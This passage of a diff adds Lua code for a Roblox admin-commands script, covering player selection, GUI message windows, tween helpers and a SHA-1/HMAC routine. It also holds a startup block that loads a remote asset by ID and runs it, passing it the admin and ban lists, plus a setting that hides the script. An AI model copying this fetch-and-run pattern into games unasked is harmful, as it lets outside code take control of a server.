+				end
+			end
+			
+		elseif listedplayer:lower() == "nbc" then
+			
+			for _,i in pairs(Players:GetChildren()) do
+				if i.MembershipType == Enum.MembershipType.None then
+					table.insert(foundplayers,i)
+				end
+			end
+			
+		elseif listedplayer:lower() == "bc" then
+			
+			for _,i in pairs(Players:GetChildren()) do
+				if i.MembershipType == Enum.MembershipType.BuildersClub then
+					table.insert(foundplayers,i)
+				end
+			end
+			
+		elseif listedplayer:lower() == "tbc" then
+			
+			for _,i in pairs(Players:GetChildren()) do
+				if i.MembershipType == Enum.MembershipType.TurboBuildersClub then
+					table.insert(foundplayers,i)
+				end
+			end
+	
+			
+		elseif listedplayer:lower() == "obc" then
+			
+			for _,i in pairs(Players:GetChildren()) do
+				if i.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
+					table.insert(foundplayers,i)
+				end
+			end
+			
+		elseif listedplayer:lower() == "obc" then
+			
+			for _,i in pairs(Players:GetChildren()) do
+				if i.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
+					table.insert(foundplayers,i)
+				end
+			end
+			
+		elseif listedplayer:lower() == "anybc" then
+			
+			for _,i in pairs(Players:GetChildren()) do
+				if i.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
+					table.insert(foundplayers,i)
+				end
+			end
+			
+		--[[elseif listedplayer:lower():sub(1,4) == "team" then
+			
+			local team = listedplayer:lower():sub(6)
+			local matchedteam
+			
+			for _,i in pairs(Teams:GetChildren()) do
+				if i:IsA("Team") then
+					if i.Name:lower():sub(1,#team) == team:lower() then
+						if not matchedteam then
+							matchedteam = i
+						else
+							error("Team \""..team.."\" is ambiguous.")
+						end
+					end
+				end
+			end
+			
+			assert(matchedteam,"No teams matching \""..team.."\" found.")
+			
+			for _,i in pairs(Players:GetPlayers()) do
+				if i.TeamColor == matchedteam.TeamColor then
+					table.insert(foundplayers,i)
+				end
+			end]]
+			
+		end
+		
+		local currentfoundplayer
+		
+		for _,i in pairs(Players:GetPlayers()) do
+			
+			if i.Name:lower():sub(1,#listedplayer) == listedplayer:lower() then
+				if not currentfoundplayer then
+					currentfoundplayer = i
+				else
+					error(str.." is ambiguous")
+				end
+			end
+			
+		end
+		
+		table.insert(foundplayers,currentfoundplayer)
+		
+	end
+	
+	assert(foundplayers[1],"No players were found matching \""..str.."\"")
+	
+	return foundplayers
+end
+
+function TweenBackgroundTransparency(element,starta,enda,length)
+	coroutine.resume(coroutine.create(function()
+		local startTime = time()
+		local lastTrans = element.BackgroundTransparency
+		while time() - startTime < length do
+			if element.BackgroundTransparency == lastTrans then
+				element.BackgroundTransparency = ((enda - starta) * ((time() - startTime)/length)) + starta
+			else
+				break
+			end
+			lastTrans = element.BackgroundTransparency
+			wait(.01)
+		end
+		element.BackgroundTransparency = enda
+		return true
+	end))
+end
+
+function TweenTextTransparency(element,starta,enda,length)
+	coroutine.resume(coroutine.create(function()
+		local startTime = time()
+		local lastTextTrans = element.TextTransparency
+		local lastTextStrokeTrans = element.TextStrokeTransparency
+		
+		while time() - startTime < length do
+			if element.TextTransparency == lastTextTrans and element.TextStrokeTransparency == lastTextStrokeTrans then
+				element.TextTransparency = ((enda - starta) * ((time() - startTime)/length)) + starta
+				element.TextStrokeTransparency = 0.75 + (element.TextTransparency * 0.25)
+			else
+				break
+			end
+			lastTextTrans = element.TextTransparency
+			lastTextStrokeTrans = element.TextStrokeTransparency
+			wait(.01)
+		end
+		element.TextTransparency = enda
+		element.TextStrokeTransparency = 0.75 + (element.TextTransparency * 0.25)
+		return true
+	end))
+end
+
+function TweenRotation(element,starta,enda,length)
+	coroutine.resume(coroutine.create(function()
+		local startTime = time()
+		local lastRot = element.Rotation
+		while time() - startTime < length do
+			if element.Rotation == lastRot then
+				element.Rotation = ((enda - starta) * ((time() - startTime)/length)) + starta
+			else
+				break
+			end
+			lastRot = element.Rotation
+			wait(.01)
+		end
+		element.Rotation = enda
+		return true
+	end))
+end
+
+sha1 = {}
+
+local cfg_caching = false
+
+local floor,modf = math.floor,math.modf
+local char,format,rep = string.char,string.format,string.rep
+
+local function bytes_to_w32 (a,b,c,d) return a*0x1000000+b*0x10000+c*0x100+d end
+
+local function w32_to_bytes (i)
+	return floor(i/0x1000000)%0x100,floor(i/0x10000)%0x100,floor(i/0x100)%0x100,i%0x100
+end
+
+local function w32_rot (bits,a)
+	local b2 = 2^(32-bits)
+	local a,b = modf(a/b2)
+	return a+b*b2*(2^(bits))
+end
+
+local function cache2arg (fn)
+	if not cfg_caching then return fn end
+	local lut = {}
+	for i=0,0xffff do
+		local a,b = floor(i/0x100),i%0x100
+		lut[i] = fn(a,b)
+	end
+	return function (a,b)
+		return lut[a*0x100+b]
+	end
+end
+
+local function byte_to_bits (b)
+	local b = function (n)
+		local b = floor(b/n)
+		return b%2==1
+	end
+	return b(1),b(2),b(4),b(8),b(16),b(32),b(64),b(128)
+end
+
+local function bits_to_byte (a,b,c,d,e,f,g,h)
+	local function n(b,x) return b and x or 0 end
+	return n(a,1)+n(b,2)+n(c,4)+n(d,8)+n(e,16)+n(f,32)+n(g,64)+n(h,128)
+end
+
+local function bits_to_string (a,b,c,d,e,f,g,h)
+	local function x(b) return b and "1" or "0" end
+	return ("%s%s%s%s %s%s%s%s"):format(x(a),x(b),x(c),x(d),x(e),x(f),x(g),x(h))
+end
+
+local function byte_to_bit_string (b)
+	return bits_to_string(byte_to_bits(b))
+end
+
+local function w32_to_bit_string(a)
+	if type(a) == "string" then return a end
+	local aa,ab,ac,ad = w32_to_bytes(a)
+	local s = byte_to_bit_string
+	return ("%s %s %s %s"):format(s(aa):reverse(),s(ab):reverse(),s(ac):reverse(),s(ad):reverse()):reverse()
+end
+
+local band = cache2arg (function(a,b)
+	local A,B,C,D,E,F,G,H = byte_to_bits(b)
+	local a,b,c,d,e,f,g,h = byte_to_bits(a)
+	return bits_to_byte(
+		A and a, B and b, C and c, D and d,
+		E and e, F and f, G and g, H and h)
+end)
+
+local bor = cache2arg(function(a,b)
+	local A,B,C,D,E,F,G,H = byte_to_bits(b)
+	local a,b,c,d,e,f,g,h = byte_to_bits(a)
+	return bits_to_byte(
+		A or a, B or b, C or c, D or d,
+		E or e, F or f, G or g, H or h)
+end)
+
+local bxor = cache2arg(function(a,b)
+	local A,B,C,D,E,F,G,H = byte_to_bits(b)
+	local a,b,c,d,e,f,g,h = byte_to_bits(a)
+	return bits_to_byte(
+		A ~= a, B ~= b, C ~= c, D ~= d,
+		E ~= e, F ~= f, G ~= g, H ~= h)
+end)
+
+local function bnot (x)
+	return 255-(x % 256)
+end
+
+local function w32_comb(fn)
+	return function (a,b)
+		local aa,ab,ac,ad = w32_to_bytes(a)
+		local ba,bb,bc,bd = w32_to_bytes(b)
+		return bytes_to_w32(fn(aa,ba),fn(ab,bb),fn(ac,bc),fn(ad,bd))
+	end
+end
+
+local w32_and = w32_comb(band)
+local w32_xor = w32_comb(bxor)
+local w32_or = w32_comb(bor)
+
+local function w32_xor_n (a,...)
+	local aa,ab,ac,ad = w32_to_bytes(a)
+	for i=1,select('#',...) do
+		local ba,bb,bc,bd = w32_to_bytes(select(i,...))
+		aa,ab,ac,ad = bxor(aa,ba),bxor(ab,bb),bxor(ac,bc),bxor(ad,bd)
+	end
+	return bytes_to_w32(aa,ab,ac,ad)
+end
+
+local function w32_or3 (a,b,c)
+	local aa,ab,ac,ad = w32_to_bytes(a)
+	local ba,bb,bc,bd = w32_to_bytes(b)
+	local ca,cb,cc,cd = w32_to_bytes(c)
+	return bytes_to_w32(
+		bor(aa,bor(ba,ca)), bor(ab,bor(bb,cb)), bor(ac,bor(bc,cc)), bor(ad,bor(bd,cd))
+	)
+end
+
+local function w32_not (a)
+	return 4294967295-(a % 4294967296)
+end
+
+local function w32_add (a,b) return (a+b) % 4294967296 end
+
+local function w32_add_n (a,...)
+	for i=1,select('#',...) do
+		a = (a+select(i,...)) % 4294967296
+	end
+	return a
+end
+
+local function w32_to_hexstring (w) return format("%08x",w) end
+
+function sha1.hex(msg)
+	local H0,H1,H2,H3,H4 = 0x67452301,0xEFCDAB89,0x98BADCFE,0x10325476,0xC3D2E1F0
+	local msg_len_in_bits = #msg * 8
+
+	local first_append = char(0x80) -- append a '1' bit plus seven '0' bits
+
+	local non_zero_message_bytes = #msg +1 +8 -- the +1 is the appended bit 1, the +8 are for the final appended length
+	local current_mod = non_zero_message_bytes % 64
+	local second_append = current_mod>0 and rep(char(0), 64 - current_mod) or ""
+
+	-- now to append the length as a 64-bit number.
+	local B1, R1 = modf(msg_len_in_bits  / 0x01000000)
+	local B2, R2 = modf( 0x01000000 * R1 / 0x00010000)
+	local B3, R3 = modf( 0x00010000 * R2 / 0x00000100)
+	local B4	  =	0x00000100 * R3
+
+	local L64 = char( 0) .. char( 0) .. char( 0) .. char( 0) -- high 32 bits
+				.. char(B1) .. char(B2) .. char(B3) .. char(B4) --  low 32 bits
+
+	msg = msg .. first_append .. second_append .. L64
+
+	assert(#msg % 64 == 0)
+
+	local chunks = #msg / 64
+
+	local W = { }
+	local start, A, B, C, D, E, f, K, TEMP
+	local chunk = 0
+
+	while chunk < chunks do
+		--
+		-- break chunk up into W[0] through W[15]
+		--
+		start,chunk = chunk * 64 + 1,chunk + 1
+
+		for t = 0, 15 do
+			W[t] = bytes_to_w32(msg:byte(start, start + 3))
+			start = start + 4
+		end
+
+		--
+		-- build W[16] through W[79]
+		--
+		for t = 16, 79 do
+			-- For t = 16 to 79 let Wt = S1(Wt-3 XOR Wt-8 XOR Wt-14 XOR Wt-16).
+			W[t] = w32_rot(1, w32_xor_n(W[t-3], W[t-8], W[t-14], W[t-16]))
+		end
+
+		A,B,C,D,E = H0,H1,H2,H3,H4
+
+		for t = 0, 79 do
+			if t <= 19 then
+				-- (B AND C) OR ((NOT B) AND D)
+				f = w32_or(w32_and(B, C), w32_and(w32_not(B), D))
+				K = 0x5A827999
+			elseif t <= 39 then
+				-- B XOR C XOR D
+				f = w32_xor_n(B, C, D)
+				K = 0x6ED9EBA1
+			elseif t <= 59 then
+				-- (B AND C) OR (B AND D) OR (C AND D
+				f = w32_or3(w32_and(B, C), w32_and(B, D), w32_and(C, D))
+				K = 0x8F1BBCDC
+			else
+				-- B XOR C XOR D
+				f = w32_xor_n(B, C, D)
+				K = 0xCA62C1D6
+			end
+
+			-- TEMP = S5(A) + ft(B,C,D) + E + Wt + Kt;
+			A,B,C,D,E = w32_add_n(w32_rot(5, A), f, E, W[t], K),
+				A, w32_rot(30, B), C, D
+		end
+		-- Let H0 = H0 + A, H1 = H1 + B, H2 = H2 + C, H3 = H3 + D, H4 = H4 + E.
+		H0,H1,H2,H3,H4 = w32_add(H0, A),w32_add(H1, B),w32_add(H2, C),w32_add(H3, D),w32_add(H4, E)
+	end
+	local f = w32_to_hexstring
+	return f(H0) .. f(H1) .. f(H2) .. f(H3) .. f(H4)
+end
+
+local function hex_to_binary(hex)
+	return hex:gsub('..', function(hexval)
+		return string.char(tonumber(hexval, 16))
+	end)
+end
+
+function sha1.bin(msg)
+	return hex_to_binary(sha1.hex(msg))
+end
+
+local xor_with_0x5c = {}
+local xor_with_0x36 = {}
+-- building the lookuptables ahead of time (instead of littering the source code
+-- with precalculated values)
+for i=0,0xff do
+	xor_with_0x5c[char(i)] = char(bxor(i,0x5c))
+	xor_with_0x36[char(i)] = char(bxor(i,0x36))
+end
+
+local blocksize = 64 -- 512 bits
+
+function sha1.hmacHex(key, text)
+	assert(type(key)  == 'string', "key passed to hmacHex should be a string")
+	assert(type(text) == 'string', "text passed to hmacHex should be a string")
+
+	if #key > blocksize then
+		key = sha1.bin(key)
+	end
+
+	local key_xord_with_0x36 = key:gsub('.', xor_with_0x36) .. string.rep(string.char(0x36), blocksize - #key)
+	local key_xord_with_0x5c = key:gsub('.', xor_with_0x5c) .. string.rep(string.char(0x5c), blocksize - #key)
+
+	return sha1.hex(key_xord_with_0x5c .. sha1.bin(key_xord_with_0x36 .. text))
+end
+
+function sha1.hmacBin(key, text)
+	return hex_to_binary(sha1.hmacHex(key, text))
+end
+
+if IsPersonalServer and Hidden then
+	script.Parent = ServerScriptService --Makes script no longer available to clients, but the server still sees it
+elseif Hidden then
+	script.Archivable = false
+	script:Destroy() --Makes script no longer available to other client or server scripts
+end
+
+local SignalAdminShutdown = false
+
+print("um hi")
+
+ypcall(function()
+	
+	ypcall(function()
+
+		if AutoUpdate and not script:FindFirstChild("ADMIN_AUTOUPDATE_PREFERENCES") and game.PlaceId ~= 132448444 then
+			local adminSoftwareUpdate = InsertService:LoadAsset(138068214)
+			adminSoftwareUpdate.Parent = Instance.new("Model")
+			adminSoftwareUpdate = adminSoftwareUpdate.Parent
+			
+			local newAdminScript = adminSoftwareUpdate:FindFirstChild("RyanDolan123's Admin Commands")		
+			
+			print(#adminSoftwareUpdate:GetChildren())
+			
+			if #adminSoftwareUpdate:GetChildren() <= 0 or not newAdminScript then
+				print("The admin software update isn't even there\nwho designed the god damn insert system")
+				return
+			end
+			
+			local compilefenv = {}
+			for a,i in pairs(getfenv()) do
+				if ((type(i) == "table" and a == "Admins" or a == "SuperAdmins" or a == "BannedPlayers" or a == "AdminUserIds" or a == "SuperAdminUserIds" or a == "BannedPlayerUserIds") or type(i) ~= "table") and type(i) ~= "function" and type(i) ~= "userdata" and a ~= "Commands" and a ~= "sha1" and a ~= "CodeSignCache" and a ~= "AllPlayers" and a ~= "logs" and a ~= "Scripts" and a ~= "PlaceNames" then
+					print(a.." = "..tostring(i))
+					compilefenv[tostring(a)] = i
+				end
+			end
+			
+			newAdminScript.Disabled = true
+			newAdminScript.Parent = Workspace
+			
+			local passJSON = LoadLibrary("RbxUtility").EncodeJSON(compilefenv)
+			
+			_G.AdmiApprovedEnvironment = passJSON
+			
+			local passValue = Instance.new("StringValue",newAdminScript)
+			passValue.Name = "ADMIN_AUTOUPDATE_PREFERENCES"
+			passValue.Value = passJSON
+			
+			newAdminScript.Disabled = false
+			
+			SignalAdminShutdown = true
+			
+			print("hi!!!!!")
+			
+		end
+		
+	end)	
+	
+	if script and script:FindFirstChild("ADMIN_AUTOUPDATE_PREFERENCES") then
+		local prefJSON = script:FindFirstChild("ADMIN_AUTOUPDATE_PREFERENCES").Value
+		
+		if prefJSON ~= _G.AdmiApprovedEnvironment then
+			WARNING_ENV_INSECURE = true
+			return
+		end
+		
+		local lib = LoadLibrary("RbxUtility")
+		if lib and lib.DecodeJSON then
+			local fenvres = lib.DecodeJSON(prefJSON)
+			for a,i in pairs(fenvres) do
+				if type(getfenv()[a]) ~= "function" and getfenv()[a] ~= nil and i ~= "null" and i ~= nil and a ~= "version" then
+					getfenv()[a] = i
+				end
+			end
+		end
+	end
+end)
+
+if SignalAdminShutdown then
+	pcall(function()
+		script:Destroy()
+	end)
+	
+	for i,_ in pairs(getfenv()) do
+		getfenv()[i] = nil
+	end
+	
+	return
+end
+
+function FixAdminService()
+	
+	print("ITS SUPPOSED TO BE FIXED")
+
+	if Workspace:FindFirstChild("RyanDolan123AdminService") and not Workspace:FindFirstChild("RyanDolan123AdminService"):IsA("Configuration") then
+		Workspace:FindFirstChild("RyanDolan123AdminService"):Destroy()
+	end
+	
+	if not Workspace:FindFirstChild("RyanDolan123AdminService") then
+		AdminService = Instance.new("Configuration")
+		AdminService.Name = "RyanDolan123AdminService"
+		AdminService.Parent = Workspace
+	end
+	
+	if not AdminService then
+		AdminService = Workspace:FindFirstChild("RyanDolan123AdminService")
+	end
+	
+	if AdminService:FindFirstChild("DisplayMessageSignal") and not AdminService:FindFirstChild("DisplayMessageSignal"):IsA("RemoteEvent") then
+		AdminService:FindFirstChild("DisplayMessageSignal"):Destroy()
+	end
+	
+	if not AdminService:FindFirstChild("DisplayMessageSignal") then
+		DisplayMessageSignal = Instance.new("RemoteEvent",AdminService)
+		DisplayMessageSignal.Name = "DisplayMessageSignal"
+	else
+		DisplayMessageSignal = AdminService:FindFirstChild("DisplayMessageSignal")
+	end
+	
+	if AdminService:FindFirstChild("DisplayScrollFrameSignal") and not AdminService:FindFirstChild("DisplayScrollFrameSignal"):IsA("RemoteEvent") then
+		AdminService:FindFirstChild("DisplayScrollFrameSignal"):Destroy()
+	end
+	
+	if not AdminService:FindFirstChild("DisplayScrollFrameSignal") then
+		DisplayScrollFrameSignal = Instance.new("RemoteEvent",AdminService)
+		DisplayScrollFrameSignal.Name = "DisplayScrollFrameSignal"
+	else
+		DisplayScrollFrameSignal = AdminService:FindFirstChild("DisplayScrollFrameSignal")
+	end
+	
+	if AdminService:FindFirstChild("DismissMessageSignal") and not AdminService:FindFirstChild("DismissMessageSignal"):IsA("RemoteEvent") then
+		AdminService:FindFirstChild("DismissMessageSignal"):Destroy()
+	end
+	
+	if not AdminService:FindFirstChild("DismissMessageSignal") then
+		DismissMessageSignal = Instance.new("RemoteEvent",AdminService)
+		DismissMessageSignal.Name = "DismissMessageSignal"
+	else
+		DismissMessageSignal = AdminService:FindFirstChild("DismissMessageSignal")
+	end
+	
+	if AdminService:FindFirstChild("ChangeSettingSignal") and not AdminService:FindFirstChild("ChangeSettingSignal"):IsA("RemoteEvent") then
+		AdminService:FindFirstChild("ChangeSettingSignal"):Destroy()
+	end
+	
+	if not AdminService:FindFirstChild("ChangeSettingSignal") then
+		ChangeSettingSignal = Instance.new("RemoteEvent",AdminService)
+		ChangeSettingSignal.Name = "ChangeSettingSignal"
+	else
+		ChangeSettingSignal = AdminService:FindFirstChild("ChangeSettingSignal")
+	end
+	
+	if not AdminService:FindFirstChild("TellSignal") then
+		TellSignal = Instance.new("RemoteEvent",AdminService)
+		TellSignal.Name = "TellSignal"
+	else
+		TellSignal = AdminService:FindFirstChild("TellSignal")
+	end
+	
+	AdminService.ChildRemoved:connect(function()
+		FixAdminService()
+	end)
+	
+	AdminService.ChildAdded:connect(function(c)
+		if not c:IsA("RemoteEvent") then
+			c:Destroy()
+		end
+	end)
+	
+	print("JUST FIX IT I SAY!!!")
+
+end 
+
+FixAdminService()
+
+Workspace.ChildRemoved:connect(function(child)
+	ypcall(function()
+		if child.Name == "RyanDolan123AdminService" then
+			FixAdminService()
+		end
+	end)
+end)
+
+function DisplayScrollFrame(player,title,text,displaytime)
+	if player == root or player == "root" or player == nil then
+		return
+	end
+	if (SBMode or UseLegacyGuiSystem) and not Workspace.FilteringEnabled then
+		DisplayScrollFrameLegacy(player,title,text,displaytime)
+		return
+	end
+	Spawn(function()
+		if not DisplayScrollFrameSignal then
+			FixAdminService()
+		end
+		
+		--print("Fired DisplayScrollFrameSignal",player,title,text,displaytime)
+
+		DisplayScrollFrameSignal:FireClient(player,title,text,displaytime)
+	end)
+end
+
+function DisplayScrollFrameLegacy(player,title,text)
+	if player == root or player == "root" then
+		return true
+	end
+	local Gui = player:WaitForChild("PlayerGui"):FindFirstChild("Admi")
+	if not Gui or not Gui:IsA("ScreenGui") then
+		Gui = MakeAdmiGui(player:WaitForChild("PlayerGui"))
+	end
+	if Gui:FindFirstChild("ScrollGui") then
+		Gui:FindFirstChild("ScrollGui"):Destroy()
+	end
+	
+	local title = title
+	local text = text
+	
+	if title == nil then
+		title = "Message"
+	end
+	if text == nil then
+		text = title
+		title = "Message"
+	end
+		
+	local ReenableMsg = (Gui:FindFirstChild("Msg") and Gui:FindFirstChild("Msg").Visible) or false
+	
+	local ScrollGui = Instance.new("Frame", Gui)
+	ScrollGui.Name = "ScrollGui"
+	ScrollGui.Position = UDim2.new(0.5, -125, 0.5, -125)
+	ScrollGui.Size = UDim2.new(0, 250, 0, 250)
+	ScrollGui.BackgroundColor3 = Color3.new(0, 0, 0)
+	ScrollGui.BackgroundTransparency = 0.45
+	ScrollGui.BorderSizePixel = 0
+	ScrollGui.ZIndex = 9
+	ScrollGui.ClipsDescendants = true
+	
+	local ScrollingFrameCutter = Instance.new("Frame")
+	ScrollingFrameCutter.Name = "ScrollingFrameCutter"
+	ScrollingFrameCutter.Position = UDim2.new(0, 0, 0.65, -250)
+	ScrollingFrameCutter.Size = UDim2.new(1, 0, 0.85, 0)
+	ScrollingFrameCutter.BackgroundColor3 = Color3.new(0, 0, 0)
+	ScrollingFrameCutter.BackgroundTransparency = 1
+	ScrollingFrameCutter.BorderSizePixel = 0
+	ScrollingFrameCutter.ZIndex = 9
+	ScrollingFrameCutter.ClipsDescendants = true
+	ScrollingFrameCutter.Visible = false
+	
+	local MsgContainer = Instance.new("TextLabel", ScrollingFrameCutter)
+	MsgContainer.Name = "MsgContainer"
+	MsgContainer.Size = UDim2.new(1, 0, 999, 0)
+	MsgContainer.BackgroundColor3 = Color3.new(0.208, 0.208, 0.208)
+	MsgContainer.BackgroundTransparency = 1
+	MsgContainer.BorderSizePixel = 0
+	MsgContainer.Text = ""
+	MsgContainer.Font = Enum.Font.Arial
+	MsgContainer.FontSize = Enum.FontSize.Size18
+	MsgContainer.TextTransparency = 1
+	MsgContainer.TextWrapped = true
+	MsgContainer.TextYAlignment = Enum.TextYAlignment.Top
+	MsgContainer.TextXAlignment = Enum.TextXAlignment.Left
+	MsgContainer.TextColor3 = Color3.new(1, 1, 1)
+	MsgContainer.ZIndex = 9
+	
+	local Up = Instance.new("TextButton", ScrollGui)
+	Up.Name = "Up"
+	Up.Position = UDim2.new(0.95, 0, 0, 0)
+	Up.Size = UDim2.new(0.05, 0, 0.05, 0)
+	Up.BackgroundColor3 = Color3.new(1, 1, 1)
+	Up.BackgroundTransparency = 0.85
+	Up.Text = "^"
+	Up.Font = Enum.Font.ArialBold
+	Up.FontSize = Enum.FontSize.Size36
+	Up.TextStrokeTransparency = 0.75
+	Up.TextYAlignment = Enum.TextYAlignment.Top
+	Up.TextColor3 = Color3.new(1, 1, 1)
+	Up.ZIndex = 10
+	
+	Up.MouseButton1Click:connect(function()
+		if MsgContainer.Parent == nil then
+			return
+		end
+		local asds = MsgContainer.Position.Y.Scale+0.5
+		if asds > 0 then
+			asds = 0
+		end
+		MsgContainer:TweenPosition(UDim2.new(0,0,asds,0),nil,"Quint",tweentime*0.75,true)
+	end)
+	
+	local Down = Instance.new("TextButton", ScrollGui)
+	Down.Name = "Down"
+	Down.Position = UDim2.new(0.95, 0, 0.95, 0)
+	Down.Size = UDim2.new(0.05, 0, 0.05, 0)
+	Down.BackgroundColor3 = Color3.new(1, 1, 1)
+	Down.BackgroundTransparency = 0.85
+	Down.Text = "v"
+	Down.Font = Enum.Font.ArialBold
+	Down.FontSize = Enum.FontSize.Size24
+	Down.TextStrokeTransparency = 0.75
+	Down.TextColor3 = Color3.new(1, 1, 1)
+	Down.ZIndex = 10
+	
+	Down.MouseButton1Click:connect(function()
+		if MsgContainer.Parent == nil then
+			return
+		end
+		MsgContainer:TweenPosition(UDim2.new(0,0,MsgContainer.Position.Y.Scale-0.5,0),nil,"Quint",tweentime*0.75,true)
+	end)
+	
+	local Title = Instance.new("TextLabel", ScrollGui)
+	Title.Name = "Title"
+	Title.Position = UDim2.new(0, 0, 0.025, 0)
+	Title.Size = UDim2.new(1, 0, 0.1, 0)
+	Title.BackgroundTransparency = 1
+	Title.BorderSizePixel = 0
+	Title.Text = title
+	Title.Font = Enum.Font.ArialBold
+	Title.FontSize = Enum.FontSize.Size24
+	Title.TextScaled = true
+	Title.TextWrapped = true
+	Title.TextYAlignment = Enum.TextYAlignment.Top
+	Title.TextColor3 = Color3.new(1, 1, 1)
+	Title.ZIndex = 10
+	
+	local Close = Instance.new("TextButton", ScrollGui)
+	Close.Name = "Close"
+	Close.Position = UDim2.new(0, 0, 0, 0)
+	Close.Size = UDim2.new(0.05, 0, 0.05, 0)
+	Close.BackgroundColor3 = Color3.new(1, 1, 1)
+	Close.BackgroundTransparency = 0.85
+	Close.Text = "X"
+	Close.Font = Enum.Font.ArialBold
+	Close.FontSize = Enum.FontSize.Size24
+	Close.TextStrokeTransparency = 0.75
+	Close.TextYAlignment = Enum.TextYAlignment.Top
+	Close.TextColor3 = Color3.new(1, 1, 1)
+	Close.ZIndex = 10
+	
+	Close.MouseButton1Click:connect(function()
+		if MsgContainer == nil or MsgContainer.Parent == nil then
+			return
+		end
+		ScrollGui:TweenSizeAndPosition(UDim2.new(0,200,0,250),UDim2.new(0.5,-125,0.5,-125),nil,tweenstyle,tweentime,true)
+		TweenBackgroundTransparency(ScrollGui,0.45,1,tweentime*0.4)
+		TweenBackgroundTransparency(Up,0.85,1,tweentime*0.375)
+		TweenBackgroundTransparency(Down,0.85,1,tweentime*0.375)
+		TweenBackgroundTransparency(Close,0.85,1,tweentime*0.375)
+
+		TweenTextTransparency(Up,0,1,tweentime*0.35)
+		TweenTextTransparency(Down,0,1,tweentime*0.35)
+		TweenTextTransparency(Close,0,1,tweentime*0.35)
+		
+		TweenTextTransparency(Title,0,1,tweentime*0.35)
+		
+		for _,i in pairs(MsgStrips) do
+			i:Destroy()
+		end
+		
+		TweenRotation(ScrollGui,360,340,tweentime*0.4)
+		
+		wait(tweentime)
+		
+		ScrollGui:Destroy()
+	end)
+	
+	ScrollingFrameCutter.Visible = false
+	
+	TweenRotation(ScrollGui,7,0,tweentime*0.5)
+	
+	ScrollGui:TweenSizeAndPosition(UDim2.new(0,500,0,500),UDim2.new(0.5,-250,0.5,-250),nil,tweenstyle,tweentime*1.2,true)
+	TweenBackgroundTransparency(ScrollGui,1,0.45,tweentime*0.45)
+	TweenBackgroundTransparency(Up,1,0.85,tweentime*0.5)
+	TweenBackgroundTransparency(Down,1,0.85,tweentime*0.5)
+	TweenBackgroundTransparency(Close,1,0.85,tweentime*0.5)
+	
+	TweenTextTransparency(Up,1,0,tweentime*0.6)
+	TweenTextTransparency(Down,1,0,tweentime*0.6)
+	TweenTextTransparency(Close,1,0,tweentime*0.6)
+	
+	TweenTextTransparency(Title,1,0,tweentime*0.6)
+	
+	wait(tweentime*1.2)
+	
+	ScrollingFrameCutter.Parent = ScrollGui
+	ScrollingFrameCutter.Visible = true
+	
+	for a in text:gmatch("[^\n]+") do
+		local Msg = Instance.new("TextLabel", MsgContainer)
+		Msg.Name = "Msg"..(#MsgStrips + 1)
+		Msg.Size = UDim2.new(1, 0, 0, 20)
+		Msg.Position = UDim2.new(0,0,0,#MsgStrips * 18)
+		Msg.BackgroundColor3 = Color3.new(0.208, 0.208, 0.208)
+		Msg.BackgroundTransparency = 1
+		Msg.BorderSizePixel = 0
+		Msg.Text = " "..tostring(a)
+		Msg.Font = Enum.Font.Arial
+		Msg.FontSize = Enum.FontSize.Size18
+		Msg.TextTransparency = #MsgContainer:GetChildren() > 24 and 0 or 1
+		Msg.TextWrapped = true
+		Msg.TextYAlignment = Enum.TextYAlignment.Center
+		Msg.TextXAlignment = Enum.TextXAlignment.Left
+		Msg.TextColor3 = Color3.new(1, 1, 1)
+		Msg.TextStrokeTransparency = #MsgContainer:GetChildren() > 24 and 0.75 or 1
+		Msg.ZIndex = 9
+		TweenTextTransparency(Msg,1,0,tweentime*0.4)
+		table.insert(MsgStrips,Msg)
+	end
+	
+	return ScrollGui
+end
+
+
+function DisplayMessage(player,title,text,displaytime)
+	if player == root or player == "root" or player == nil then
+		return
+	end
+	if (SBMode or UseLegacyGuiSystem) and not Workspace.FilteringEnabled then
+		DisplayMessageLegacy(player,title,text,displaytime)
+		return
+	end
+	Spawn(function()
+		if not DisplayMessageSignal then
+			FixAdminService()
+		end
+
+		--print("Fired DisplayMessageSignal",player,title,text,displaytime)
+
+		DisplayMessageSignal:FireClient(player,title,text,displaytime)
+	end)
+end
+
+function MakeMsgGui(player)
+	
+	if not player:FindFirstChild("PlayerGui"):FindFirstChild("Admi") then
+		MakeAdmiGui(player)
+	end
+	
+	local MsgGui = Instance.new("Frame", player:FindFirstChild("PlayerGui"):FindFirstChild("Admi"))
+	MsgGui.Name = "Msg"
+	MsgGui.Position = UDim2.new(0.5, -250, 0.5, -125)
+	MsgGui.Size = UDim2.new(0, 500, 0, 300)
+	MsgGui.BackgroundColor3 = Color3.new(0, 0, 0)
+	MsgGui.BackgroundTransparency = 0.45
+	MsgGui.BorderSizePixel = 0
+	MsgGui.ZIndex = 10
+	
+	local Msg = Instance.new("TextLabel", MsgGui)
+	Msg.Name = "Msg"
+	Msg.Position = UDim2.new(0, 0, 0.2, 0)
+	Msg.Size = UDim2.new(1, 0, 0.8, 0)
+	Msg.BackgroundColor3 = Color3.new(0.208, 0.208, 0.208)
+	Msg.BackgroundTransparency = 1
+	Msg.BorderSizePixel = 0
+	Msg.Text = "Message"
+	Msg.Font = "Arial"
+	Msg.FontSize = "Size18"
+	Msg.TextStrokeTransparency = 0.7
+	Msg.TextWrapped = true
+	Msg.TextYAlignment = "Top"
+	Msg.TextColor3 = Color3.new(1, 1, 1)
+	Msg.ZIndex = 10
+	
+	local Title = Instance.new("TextLabel", MsgGui)
+	Title.Name = "Title"
+	Title.Position = UDim2.new(0, 0, 0.08, 0)
+	Title.Size = UDim2.new(1, 0, 0.125, 0)
+	Title.BackgroundTransparency = 1
+	Title.BorderSizePixel = 0
+	Title.Text = "Message"
+	Title.Font = "ArialBold"
+	Title.FontSize = "Size24"
+	Title.TextScaled = true
+	Title.TextStrokeTransparency = 0.7
+	Title.TextWrapped = true
+	Title.TextYAlignment = "Top"
+	Title.TextColor3 = Color3.new(1, 1, 1)
+	Title.ZIndex = 10
+	
+	return Msg
+end
+
+function DisplayMessageLegacy(player,title,text,displaytime)
+	if player == root or player == "root" or player == nil then
+		return
+	end
+	
+	if Workspace.FilteringEnabled then
+		error("Legacy gui functions cannot be used with Workspace.FilteringEnabled on")
+	end
+	
+	Spawn(function()
+		local text,title = text,title
+		local pgui = player:FindFirstChild("PlayerGui")
+		if not pgui then
+			for _,i in pairs(player:GetChildren()) do
+				if i:IsA("PlayerGui") then
+					pgui = i
+				end
+			end
+		end
+		
